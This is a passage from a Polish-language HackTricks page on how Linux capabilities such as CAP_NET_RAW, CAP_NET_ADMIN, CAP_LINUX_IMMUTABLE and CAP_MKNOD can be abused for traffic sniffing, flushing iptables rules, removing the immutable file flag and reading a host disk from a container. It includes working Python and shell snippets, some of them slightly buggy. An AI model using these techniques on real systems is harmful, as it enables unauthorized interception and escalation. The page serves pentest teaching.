[**CAP\_NET\_RAW**](https://man7.org/linux/man-pages/man7/capabilities.7.html) uprawnienie pozwala procesom na **tworzenie gniazd RAW i PACKET**, co umożliwia generowanie i wysyłanie dowolnych pakietów sieciowych. Może to prowadzić do zagrożeń bezpieczeństwa w środowiskach kontenerowych, takich jak fałszowanie pakietów, wstrzykiwanie ruchu i omijanie kontroli dostępu do sieci. Złośliwi aktorzy mogą to wykorzystać do zakłócania routingu kontenerów lub kompromitacji bezpieczeństwa sieci hosta, szczególnie bez odpowiednich zabezpieczeń zapory. Dodatkowo, **CAP_NET_RAW** jest kluczowe dla uprzywilejowanych kontenerów, aby wspierać operacje takie jak ping za pomocą żądań RAW ICMP.

**To oznacza, że możliwe jest podsłuchiwanie ruchu.** Nie możesz bezpośrednio eskalować uprawnień za pomocą tego uprawnienia.

**Przykład z binarką**

Jeśli binarka **`tcpdump`** ma to uprawnienie, będziesz mógł jej użyć do przechwytywania informacji sieciowych.
```bash
getcap -r / 2>/dev/null
/usr/sbin/tcpdump = cap_net_raw+ep
```
Zauważ, że jeśli **środowisko** przyznaje tę zdolność, możesz również użyć **`tcpdump`**, aby przechwycić ruch.

**Przykład z binarnym 2**

Poniższy przykład to kod **`python2`**, który może być przydatny do przechwytywania ruchu interfejsu "**lo**" (**localhost**). Kod pochodzi z laboratorium "_Podstawy: CAP-NET\_BIND + NET\_RAW_" z [https://attackdefense.pentesteracademy.com/](https://attackdefense.pentesteracademy.com)
```python
import socket
import struct

flags=["NS","CWR","ECE","URG","ACK","PSH","RST","SYN","FIN"]

def getFlag(flag_value):
flag=""
for i in xrange(8,-1,-1):
if( flag_value & 1 <<i ):
flag= flag + flags[8-i] + ","
return flag[:-1]

s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 2**30)
s.bind(("lo",0x0003))

flag=""
count=0
while True:
frame=s.recv(4096)
ip_header=struct.unpack("!BBHHHBBH4s4s",frame[14:34])
proto=ip_header[6]
ip_header_size = (ip_header[0] & 0b1111) * 4
if(proto==6):
protocol="TCP"
tcp_header_packed = frame[ 14 + ip_header_size : 34 + ip_header_size]
tcp_header = struct.unpack("!HHLLHHHH", tcp_header_packed)
dst_port=tcp_header[0]
src_port=tcp_header[1]
flag=" FLAGS: "+getFlag(tcp_header[4])

elif(proto==17):
protocol="UDP"
udp_header_packed_ports = frame[ 14 + ip_header_size : 18 + ip_header_size]
udp_header_ports=struct.unpack("!HH",udp_header_packed_ports)
dst_port=udp_header[0]
src_port=udp_header[1]

if (proto == 17 or proto == 6):
print("Packet: " + str(count) + " Protocol: " + protocol + " Destination Port: " + str(dst_port) + " Source Port: " + str(src_port) + flag)
count=count+1
```
## CAP\_NET\_ADMIN + CAP\_NET\_RAW

[**CAP\_NET\_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) uprawnienie daje posiadaczowi moc **zmiany konfiguracji sieci**, w tym ustawień zapory, tabel routingu, uprawnień gniazd oraz ustawień interfejsów sieciowych w ramach wystawionych przestrzeni nazw sieci. Umożliwia również włączenie **trybu promiskuitywnego** na interfejsach sieciowych, co pozwala na sniffing pakietów w różnych przestrzeniach nazw.

**Przykład z binarnym**

Załóżmy, że **binarne pliki python** mają te uprawnienia.
```python
#Dump iptables filter table rules
import iptc
import pprint
json=iptc.easy.dump_table('filter',ipv6=False)
pprint.pprint(json)

#Flush iptables filter table
import iptc
iptc.easy.flush_table('filter')
```
## CAP\_LINUX\_IMMUTABLE

**To oznacza, że możliwe jest modyfikowanie atrybutów inode.** Nie możesz bezpośrednio eskalować uprawnień za pomocą tej zdolności.

**Przykład z binarnym**

Jeśli odkryjesz, że plik jest niemodyfikowalny, a python ma tę zdolność, możesz **usunąć atrybut niemodyfikowalności i uczynić plik modyfikowalnym:**
```python
#Check that the file is imutable
lsattr file.sh
----i---------e--- backup.sh
```

```python
#Pyhton code to allow modifications to the file
import fcntl
import os
import struct

FS_APPEND_FL = 0x00000020
FS_IOC_SETFLAGS = 0x40086602

fd = os.open('/path/to/file.sh', os.O_RDONLY)
f = struct.pack('i', FS_APPEND_FL)
fcntl.ioctl(fd, FS_IOC_SETFLAGS, f)

f=open("/path/to/file.sh",'a+')
f.write('New content for the file\n')
```
{% hint style="info" %}
Zauważ, że zazwyczaj ten atrybut niemutowalny jest ustawiany i usuwany za pomocą:
```bash
sudo chattr +i file.txt
sudo chattr -i file.txt
```
{% endhint %}

## CAP\_SYS\_CHROOT

[**CAP\_SYS\_CHROOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) umożliwia wykonanie wywołania systemowego `chroot(2)`, co potencjalnie może pozwolić na ucieczkę z środowisk `chroot(2)` poprzez znane luki:

* [Jak wydostać się z różnych rozwiązań chroot](https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf)
* [chw00t: narzędzie do ucieczki z chroot](https://github.com/earthquake/chw00t/)

## CAP\_SYS\_BOOT

[**CAP\_SYS\_BOOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) nie tylko pozwala na wykonanie wywołania systemowego `reboot(2)` w celu ponownego uruchomienia systemu, w tym na konkretne polecenia, takie jak `LINUX_REBOOT_CMD_RESTART2` dostosowane do określonych platform sprzętowych, ale także umożliwia użycie `kexec_load(2)` oraz, od wersji Linux 3.17, `kexec_file_load(2)` do ładowania nowych lub podpisanych jąder awaryjnych.

## CAP\_SYSLOG

[**CAP\_SYSLOG**](https://man7.org/linux/man-pages/man7/capabilities.7.html) został oddzielony od szerszego **CAP_SYS_ADMIN** w Linux 2.6.37, przyznając konkretną możliwość użycia wywołania `syslog(2)`. Ta zdolność umożliwia przeglądanie adresów jądra za pośrednictwem `/proc` i podobnych interfejsów, gdy ustawienie `kptr_restrict` wynosi 1, co kontroluje ujawnianie adresów jądra. Od Linux 2.6.39 domyślna wartość dla `kptr_restrict` wynosi 0, co oznacza, że adresy jądra są ujawniane, chociaż wiele dystrybucji ustawia to na 1 (ukryj adresy z wyjątkiem uid 0) lub 2 (zawsze ukrywaj adresy) z powodów bezpieczeństwa.

Dodatkowo, **CAP_SYSLOG** pozwala na dostęp do wyjścia `dmesg`, gdy `dmesg_restrict` jest ustawione na 1. Pomimo tych zmian, **CAP_SYS_ADMIN** zachowuje możliwość wykonywania operacji `syslog` z powodu historycznych precedensów.

## CAP\_MKNOD

[**CAP\_MKNOD**](https://man7.org/linux/man-pages/man7/capabilities.7.html) rozszerza funkcjonalność wywołania systemowego `mknod` poza tworzenie zwykłych plików, FIFO (nazwanych potoków) lub gniazd domeny UNIX. Specjalnie pozwala na tworzenie plików specjalnych, które obejmują:

- **S_IFCHR**: Pliki specjalne znakowe, które są urządzeniami takimi jak terminale.
- **S_IFBLK**: Pliki specjalne blokowe, które są urządzeniami takimi jak dyski.

Ta zdolność jest niezbędna dla procesów, które wymagają możliwości tworzenia plików urządzeń, ułatwiając bezpośrednią interakcję z hardwarem poprzez urządzenia znakowe lub blokowe.

Jest to domyślna zdolność dockera ([https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19](https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19)).

Ta zdolność pozwala na eskalację uprawnień (poprzez pełne odczytywanie dysku) na hoście, pod tymi warunkami:

1. Mieć początkowy dostęp do hosta (bez uprawnień).
2. Mieć początkowy dostęp do kontenera (z uprawnieniami (EUID 0) i efektywnym `CAP_MKNOD`).
3. Host i kontener powinny dzielić tę samą przestrzeń nazw użytkowników.

**Kroki do utworzenia i uzyskania dostępu do urządzenia blokowego w kontenerze:**

1. **Na hoście jako standardowy użytkownik:**
- Określ swój aktualny identyfikator użytkownika za pomocą `id`, np. `uid=1000(standarduser)`.
- Zidentyfikuj docelowe urządzenie, na przykład `/dev/sdb`.

2. **Wewnątrz kontenera jako `root`:**
```bash
# Create a block special file for the host device
mknod /dev/sdb b 8 16
# Set read and write permissions for the user and group
chmod 660 /dev/sdb
# Add the corresponding standard user present on the host
useradd -u 1000 standarduser
# Switch to the newly created user
su standarduser
```
3. **Z powrotem na hoście:**
```bash
# Locate the PID of the container process owned by "standarduser"
# This is an illustrative example; actual command might vary
ps aux | grep -i container_name | grep -i standarduser
# Assuming the found PID is 12345
# Access the container's filesystem and the special block device
head /proc/12345/root/dev/sdb
```
To podejście pozwala standardowemu użytkownikowi na dostęp i potencjalne odczytanie danych z `/dev/sdb` przez kontener, wykorzystując współdzielone przestrzenie nazw użytkowników i uprawnienia ustawione na urządzeniu.

### CAP\_SETPCAP

**CAP_SETPCAP** umożliwia procesowi **zmianę zestawów uprawnień** innego procesu, co pozwala na dodawanie lub usuwanie uprawnień z zestawów efektywnych, dziedzicznych i dozwolonych. Jednak proces może modyfikować tylko te uprawnienia, które posiada w swoim własnym dozwolonym zestawie, co zapewnia, że nie może podnieść uprawnień innego procesu ponad swoje własne. Ostatnie aktualizacje jądra zaostrzyły te zasady, ograniczając `CAP_SETPCAP` do jedynie zmniejszania uprawnień w swoim własnym lub dozwolonym zestawie swoich potomków, mając na celu złagodzenie ryzyk bezpieczeństwa. Użycie wymaga posiadania `CAP_SETPCAP` w zestawie efektywnym oraz docelowych uprawnień w zestawie dozwolonym, wykorzystując `capset()` do modyfikacji. To podsumowuje podstawową funkcję i ograniczenia `CAP_SETPCAP`, podkreślając jego rolę w zarządzaniu uprawnieniami i poprawie bezpieczeństwa.

**`CAP_SETPCAP`** to uprawnienie w systemie Linux, które pozwala procesowi na **modyfikację zestawów uprawnień innego procesu**. Daje możliwość dodawania lub usuwania uprawnień z efektywnych, dziedzicznych i dozwolonych zestawów uprawnień innych procesów. Jednak istnieją pewne ograniczenia dotyczące tego, jak to uprawnienie może być używane.

Proces z `CAP_SETPCAP` **może jedynie przyznawać lub usuwać uprawnienia, które znajdują się w jego własnym dozwolonym zestawie uprawnień**. Innymi słowy, proces nie może przyznać uprawnienia innemu procesowi, jeśli sam go nie posiada. To ograniczenie zapobiega podnoszeniu uprawnień innego procesu ponad własny poziom uprawnień.

Ponadto, w ostatnich wersjach jądra, uprawnienie `CAP_SETPCAP` zostało **dodatkowo ograniczone**. Już nie pozwala procesowi na dowolną modyfikację zestawów uprawnień innych procesów. Zamiast tego **pozwala jedynie procesowi na obniżenie uprawnień w swoim własnym dozwolonym zestawie uprawnień lub w dozwolonym zestawie uprawnień swoich potomków**. Ta zmiana została wprowadzona w celu zmniejszenia potencjalnych ryzyk bezpieczeństwa związanych z tym uprawnieniem.

Aby skutecznie używać `CAP_SETPCAP`, musisz mieć to uprawnienie w swoim efektywnym zestawie uprawnień oraz docelowe uprawnienia w swoim dozwolonym zestawie uprawnień. Możesz następnie użyć wywołania systemowego `capset()`, aby modyfikować zestawy uprawnień innych procesów.

Podsumowując, `CAP_SETPCAP` pozwala procesowi na modyfikację zestawów uprawnień innych procesów, ale nie może przyznawać uprawnień, których sam nie posiada. Dodatkowo, z powodu obaw o bezpieczeństwo, jego funkcjonalność została ograniczona w ostatnich wersjach jądra do jedynie obniżania uprawnień w swoim własnym dozwolonym zestawie uprawnień lub w dozwolonych zestawach uprawnień swoich potomków.

## References

**Większość tych przykładów pochodzi z niektórych laboratoriów** [**https://attackdefense.pentesteracademy.com/**](https://attackdefense.pentesteracademy.com), więc jeśli chcesz ćwiczyć te techniki privesc, polecam te laboratoria.

**Inne odniesienia**:

* [https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux](https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux)
* [https://www.schutzwerk.com/en/43/posts/linux\_container\_capabilities/#:\~:text=Inherited%20capabilities%3A%20A%20process%20can,a%20binary%2C%20e.g.%20using%20setcap%20.](https://www.schutzwerk.com/en/43/posts/linux\_container\_capabilities/)
* [https://linux-audit.com/linux-capabilities-101/](https://linux-audit.com/linux-capabilities-101/)
* [https://www.linuxjournal.com/article/5737](https://www.linuxjournal.com/article/5737)
* [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap\_sys\_module](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap\_sys\_module)
* [https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot](https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot)

​

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com/) to najważniejsze wydarzenie związane z cyberbezpieczeństwem w **Hiszpanii** i jedno z najważniejszych w **Europie**. Z **misją promowania wiedzy technicznej**, ten kongres jest gorącym punktem spotkań dla profesjonalistów technologii i cyberbezpieczeństwa w każdej dziedzinie.

{% embed url="https://www.rootedcon.com/" %}
{% hint style="success" %}
Ucz się i ćwicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz się i ćwicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie dla HackTricks</summary>

* Sprawdź [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Dziel się trikami hackingowymi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów na GitHubie.

</details>
{% endhint %}
</details>
{% endhint %}
